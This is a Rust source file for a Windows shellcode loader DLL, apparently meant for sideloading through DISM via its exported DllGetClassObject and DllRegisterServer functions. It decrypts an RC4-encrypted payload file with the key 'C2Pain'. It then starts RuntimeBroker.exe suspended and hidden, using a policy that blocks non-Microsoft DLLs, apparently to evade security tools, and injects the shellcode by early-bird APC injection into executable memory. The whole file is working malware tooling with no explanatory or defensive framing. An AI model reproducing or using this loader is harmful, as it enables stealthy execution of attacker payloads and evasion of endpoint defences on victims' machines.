#[warn(non_snake_case)]
use rc4::{Rc4, KeyInit, StreamCipher};
use ntapi::ntzwapi::{
    ZwAllocateVirtualMemory, ZwWriteVirtualMemory, ZwQueueApcThread, ZwAlertResumeThread,
};
use std::{fs::File, io::Read};
use std::{ptr::null_mut, ffi::c_void};
use std::mem;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::ntdef::PVOID;
use std::thread;
use std::time::Duration;
use windows::{
    core::{s, PSTR},
    Win32::System::{
            Memory::{
                GetProcessHeap, 
                HeapAlloc, 
                HEAP_ZERO_MEMORY},
            Threading::{
                CreateProcessA, 
                DeleteProcThreadAttributeList, 
                InitializeProcThreadAttributeList,
                UpdateProcThreadAttribute,
                CREATE_SUSPENDED , 
                CREATE_NO_WINDOW, 
                EXTENDED_STARTUPINFO_PRESENT, 
                PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, 
                PROCESS_INFORMATION,
                LPPROC_THREAD_ATTRIBUTE_LIST, 
                STARTUPINFOEXA,
                STARTUPINFOW_FLAGS,
            },
        },
};

const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x00000001u64 << 44;

#[no_mangle] //Dism
pub extern "system" fn DllGetClassObject() { main(); }
#[no_mangle] //Dism
pub extern "system" fn DllRegisterServer() { main(); }

fn read_file(filename: &str) -> Vec<u8> {
    let mut file = File::open(filename).expect("Failed to open file");
    let mut contents = Vec::new();
    file.read_to_end(&mut contents).expect("Failed to read file");
    contents
}

fn decrypt_rc4(filename: &str) -> Vec<u8> {
    let mut buf = read_file(filename);
    let mut rc4 = Rc4::new(b"C2Pain".into());

    rc4.apply_keystream(&mut buf);

    buf
}

fn main() {
    unsafe {winapi::um::wincon::FreeConsole();};
    let shellcode = decrypt_rc4("r-a-w-4.enc"); //payload filename
    
    unsafe {
        let mut pi = PROCESS_INFORMATION::default();
        let mut si = STARTUPINFOEXA::default();
        si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXA>() as u32;
        si.StartupInfo.dwFlags = STARTUPINFOW_FLAGS(EXTENDED_STARTUPINFO_PRESENT.0);
        let mut attr_size: usize = 0;

        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST(null_mut()),
            1,
            0,
            &mut attr_size,
        );

        let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(HeapAlloc(
            GetProcessHeap().unwrap(),
            HEAP_ZERO_MEMORY,
            attr_size,
        ));

        let _ = InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size);

        let policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        let _ = UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY as usize,
            Some(&policy as *const _ as *const c_void),
            std::mem::size_of::<u64>(),
            None,
            None,
        );

        si.lpAttributeList = attr_list;
        let _process = CreateProcessA(
            None,
            PSTR(s!("C:\\Windows\\System32\\RuntimeBroker.exe").as_ptr() as *mut u8), // File path
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW ,
            None,
            None,
            &si.StartupInfo,
            &mut pi,
        ).unwrap_or_else(|e| {
            panic!("[!] CreateProcessA Failed With Error: {e}");
        });
        DeleteProcThreadAttributeList(attr_list);
        
        let mut allocation_start: PVOID = std::ptr::null_mut(); // Set the appropriate allocation start address
        let mut allocation_size: SIZE_T = shellcode.len(); // Set the appropriate allocation size
        let pi_hprocess = pi.hProcess;
        let pi_hthread = pi.hThread;
        let hprocess: *mut winapi::ctypes::c_void = unsafe { mem::transmute(pi_hprocess) };
        let hthread: *mut winapi::ctypes::c_void = unsafe { mem::transmute(pi_hthread) };

        // Define the constants for MEM_COMMIT, MEM_RESERVE, and PAGE_EXECUTE_READWRITE
        const MEM_COMMIT: u32 = 0x1000;
        const MEM_RESERVE: u32 = 0x2000;
        const PAGE_EXECUTE_READWRITE: u32 = 0x40;

        ZwAllocateVirtualMemory(
            hprocess,
            &mut allocation_start as *mut PVOID,
            0,
            &mut allocation_size as *mut SIZE_T,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        ZwWriteVirtualMemory(
            hprocess,
            allocation_start,
            shellcode.as_ptr() as PVOID,
            allocation_size,
            std::ptr::null_mut(),
        );

        ZwQueueApcThread(
            hthread,
            Some(std::mem::transmute(allocation_start)),
            allocation_start,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        ZwAlertResumeThread(hthread, std::ptr::null_mut());
        thread::sleep(Duration::from_secs(5));
    }
}